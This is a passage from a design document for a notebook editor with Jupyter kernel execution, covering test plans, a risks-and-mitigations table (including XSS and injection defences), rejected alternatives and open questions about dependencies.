1. **`notebookParser.test.ts`** — Valid v4, string vs array source, missing metadata, invalid JSON, v3 rejection, 500-cell cap, unknown cell types, output parsing
2. **`notebookSerializer.test.ts`** — Round-trip fidelity (parse → modify → serialize → parse = expected), source line splitting, key sorting, metadata preservation, indentation detection
3. **`notebookUndoStack.test.ts`** — Push/undo/redo for each operation type, max stack size, redo cleared on new push
4. **`AnsiRenderer.test.ts`** — 16-color, bright, bold/italic/underline, 256-color, 24-bit, nested styles, malformed sequences
5. **`NotebookOutput.test.ts`** — MIME priority, base64 images, HTML sanitization (XSS blocked), error formatting, stream merging, truncation

### Backend Tests (Kernel)

6. **`test_kernel_manager.py`** — Mock `jupyter_client`; test start/stop/restart/interrupt lifecycle, dead kernel detection, shutdown_all cleanup, missing jupyter graceful fallback
7. **`test_kernel_routes.py`** — REST endpoint tests (specs, start, status), error responses when jupyter unavailable
8. **`test_kernel_ws.py`** — WebSocket handler: execute message routing, output streaming, cell_id mapping, interrupt handling

### Integration Tests

- Open `.ipynb` → renders cells correctly
- Click cell → enters edit mode (Monaco visible)
- Escape → exits to command mode
- Type in cell → dirty indicator appears
- Ctrl+S → saves, dirty clears
- A/B → inserts cells at correct position
- DD → deletes cell, Z → undoes deletion
- M/Y → changes cell type, content preserved
- Alt+Up/Down → moves cell
- JSON toggle → shows raw JSON, edits round-trip
- Ctrl+Enter → executes cell, outputs stream in, execution count updates
- Shift+Enter → executes and advances to next cell
- Interrupt (I,I) → stops running execution
- Run with no jupyter installed → shows install banner, no crash

### Manual Test Scenarios

- Real notebooks from: scikit-learn, pandas docs, matplotlib gallery
- Documentation-only notebooks (all markdown)
- Notebooks with large image outputs
- Notebooks with error tracebacks (ANSI colors)
- Notebooks with HTML tables (pandas DataFrames)
- Empty notebook, single-cell notebook
- Corrupt notebook (invalid JSON)
- Round-trip test: open → edit cell → save → reopen → verify outputs/metadata preserved
- Execution test: run `print("hello")` → verify stdout appears
- Execution test: run `1/0` → verify traceback renders with ANSI colors
- Execution test: run `import matplotlib.pyplot as plt; plt.plot([1,2,3]); plt.show()` → verify image output
- Execution test: run `import pandas as pd; pd.DataFrame({"a": [1,2]})` → verify HTML table output
- Execution test: long-running cell → interrupt → verify KeyboardInterrupt output
- Execution test: kernel dies (e.g., `import os; os._exit(1)`) → verify "Kernel died" banner

---

## Risks & Mitigations

### Feature-Internal Risks

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| XSS via HTML outputs | Medium | High | DOMPurify with restrictive allowlist + CSS `url()` stripping hook |
| CSS data exfiltration via `style` attribute | Medium | High | DOMPurify hook strips `url()` values from inline styles (see Security section) |
| SVG with embedded scripts | Medium | High | SVGs rendered via `<img>` data URI (fully sandboxed), never inline HTML |
| Round-trip data loss (outputs, metadata) | Medium | High | Store raw original objects; parse→serialize→parse round-trip tests against real-world notebooks |
| Monaco mount/unmount flicker | Medium | Medium | Match font metrics exactly; batch DOM operations in `requestAnimationFrame` |
| Height jump on cell focus change | Medium | Medium | Static `<pre>` and Monaco use identical padding/font/line-height |
| Memory spike on huge notebooks | Low | Medium | 500-cell cap, lazy rendering, single Monaco |
| Undo stack loses sync with cell state | Low | Medium | Undo stack stores full cell snapshots (not diffs) |
| Kernel subprocess leak (not cleaned up) | Medium | Medium | Shutdown hook in app lifespan; SIGTERM then SIGKILL after 5s; track PIDs |
| Kernel dies mid-execution | Medium | Low | Heartbeat monitoring; "Kernel died — Restart?" banner; outputs from partial execution preserved |
| jupyter_client not installed | High | Low | Graceful degradation: edit-only mode, hide run buttons, show per-host install instructions |
| ZMQ port exhaustion on remote hosts | Low | Low | RWS bridges all kernel comms over single TCP port via helper subprocess; no ZMQ port forwarding |
| Runaway kernel (infinite loop, OOM) | Medium | Medium | Interrupt button (SIGINT); kernel restart; no auto-restart on OOM to avoid loops |
| Kernel name injection | Low | High | Validate `kernel_name` against `jupyter kernelspec list` before passing to `jupyter_client` |

### Regression Risks (Impact on Existing Features)

| Risk | Likelihood | Impact | Affected Code | Mitigation |
|---|---|---|---|---|
| Keyboard shortcut conflicts (J/K/A/B/D/M/Y/Z captured globally) | High | High | `WorkerDetail.tsx:264-287`, `WorkerWorkspace.tsx:155-207`, `FileExplorerPanel.tsx:768-822` | Notebook `onKeyDown` must `stopPropagation()` for all consumed keys. Command-mode keys ONLY activate when notebook container has DOM focus. Add integration tests: press J/K with file explorer focused (tree navigates), with notebook focused (cells navigate), with terminal focused (input goes to terminal). |
| Monaco multi-instance race conditions | Medium | Medium | `FileViewer.tsx:5-26, 274-302` | Use separate `ITextModel` instances per editor. Guard `model.setValue()` with `isSettingValue` flag to prevent `onDidChangeModelContent` from firing during programmatic updates. Test rapid tab switching between `.py` and `.ipynb` tabs. |
| External change detection destroys notebook state | Medium | High | `useEditorTabs.ts:275-327` | For `.ipynb` tabs, mtime change must notify NotebookEditor instead of silently reloading via `fetchTabContent` (which replaces `currentContent` and wipes React state). Options: (a) disable mtime polling while kernel is running, (b) diff at cell level on external change, (c) only show banner, never auto-reload. |
| Tab dirty flag false positive on open | High | Low | `useEditorTabs.ts:668-673` | Serializer must exactly reproduce original formatting for unmodified notebooks (detect indentation, preserve key order). Test: open `.ipynb`, make no edits → dirty flag must be false. |
| Double-tap shortcuts (DD, II, 00) conflict with global handlers | Low | Medium | `WorkerDetail.tsx:264-287` | First keypress in double-tap sequence must not be consumed by a document-level handler. The notebook's timer-based double-tap window (500ms) must check `event.target` is within the notebook container. |
| CSS output bleed — notebook HTML outputs affect app styles | Low | Medium | Global CSS, `.nb-cell__outputs` | Add CSS isolation (scoped styles or `all: initial` reset) inside `.nb-cell__outputs` container to prevent pandas/matplotlib class names from matching app selectors, and vice versa. |

---

## Alternatives Considered

### 1. One Monaco per cell (real instances)

**Rejected.** 50 cells × 2MB = 100MB. VS Code avoids this too — it uses a single editor that follows focus. We do the same.

### 2. Use an existing React notebook library

**Rejected.** `@nteract/notebook-render` and `@jupyterlab/rendermime` are heavyweight, tightly coupled to JupyterLab, poorly maintained, and don't match our design system. Our implementation reuses existing components and is ~2,000 lines of focused code.

### 3. Render notebooks in an iframe via nbconvert

**Rejected.** Requires Python `nbconvert` on host, breaks theming, no editing support, breaks Tauri CSP.

### 4. Full virtual scrolling

**Rejected.** Variable-height cells make it impractical, breaks Ctrl+F, and IntersectionObserver gives 90% of the benefit. Revisit if users hit performance issues with 200+ cells.

### 5. Read-only viewer (no editing)

**Rejected.** Editing is the core value proposition — users need to modify notebook cells (fix code, update markdown documentation) as part of their workflow. The single-Monaco pattern keeps cost low.

---

## Open Questions

1. **Should we support `text/latex` outputs?** Requires KaTeX (~300KB). **Recommendation:** Defer, show as raw text for now.

2. **Should multi-cell selection be in Phase 3?** It adds complexity (range tracking, batch operations) but is useful for bulk delete/move. **Recommendation:** Defer to future. Single-cell operations cover 90% of use cases.

3. **Should JSON toggle edits sync back to cell view?** If the user edits raw JSON and toggles back, we'd need to re-parse. **Recommendation:** Yes, but show a confirmation if parsing fails ("Invalid JSON — stay in JSON view?").

4. **Should `jupyter_client` be a hard or optional dependency?** ~~Making it optional means the orchestrator can install without `pyzmq` (which requires native compilation). **Recommendation:** Optional — `try: import jupyter_client` with graceful fallback. Add to `[project.optional-dependencies]` as `notebook = ["jupyter_client>=8.0"]`.~~ **Decision: Neither.** `jupyter_client` is not added to `pyproject.toml` at all — not as a hard dependency, not as an optional dependency. It is detected purely at runtime via `try: import jupyter_client`. This keeps `pyzmq` (native C extension) completely out of the orchestrator's dependency tree, avoiding PyInstaller bundling complications. Users install it independently on each worker host.

5. **Should we bundle `ipykernel`?** The orchestrator doesn't need a kernel itself — the user does. **Decision:** No. Kernel dependencies (`jupyter_client`, `ipykernel`) must be lazy-installed on each worker host independently. The install banner shows per-host instructions when missing.

6. **Should "Run All" continue on error or stop?** Jupyter stops, VS Code stops by default. **Recommendation:** Stop on error (matching both). Add a "Continue on error" option in the toolbar More menu later if requested.
